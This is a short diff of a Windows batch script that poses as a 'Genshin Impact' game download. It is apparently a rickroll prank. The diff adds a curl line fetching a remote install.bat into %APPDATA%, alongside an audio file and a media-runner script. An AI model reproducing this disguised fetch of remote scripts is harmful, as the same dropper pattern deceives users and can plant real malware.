@@ -6,6 +6,7 @@ echo Downloading Game
   mkdir %APPDATA%\GenshinImpact
   curl -o %APPDATA%\GenshinImpact\role.mp3 -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
   curl -o %APPDATA%\GenshinImpact\m.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
+  curl -o %APPDATA%\GenshinImpact\i.bat -LO https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/install.bat
   goto play
  
  :play
